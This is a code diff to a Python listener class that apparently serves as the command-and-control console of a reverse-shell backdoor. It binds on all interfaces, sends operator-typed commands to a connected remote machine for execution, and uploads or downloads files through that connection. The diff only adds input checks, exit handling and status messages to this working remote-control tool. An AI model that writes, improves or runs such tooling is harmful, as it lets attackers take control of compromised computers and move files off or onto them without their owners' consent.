@@ -58,20 +58,35 @@ class Listener :
     
     def run(self):
         while True:
-            command = input(">>")
-            command = command.split(" ")
             try:
-                if command[0] == "upload":
+                command_input = input(">> ")
+                if not command_input.strip():
+                    continue
+                command = command_input.split(" ")
+            except KeyboardInterrupt:
+                print("\n[*] Exiting...")
+                self.connection.close()
+                self.listener.close()
+                break
+
+            try:
+                if len(command) < 1:
+                    print("[!] Invalid command")
+                    continue
+
+                if command[0] == "upload" and len(command) > 1:
                     file_content = self.read_file(command[1])
                     command.append(file_content)
+
                 result = self.execute_remotely(command)
-                if(command[0] == "download"):
-                    self.write_file(command[1] , result)
+
+                if command[0] == "download" and len(command) > 1:
+                    self.write_file(command[1], result)
+                    print(f"[*] File downloaded: {command[1]}")
+                else:
+                    print(result, end="")
             except Exception as e:
-                result = "[!] Error: " + str(e)     
-
-            print(result, end="")
-
+                print(f"[!] Error: {e}")
 my_listener = Listener("0.0.0.0" , "Port number here as integer")
 my_listener.run()
 
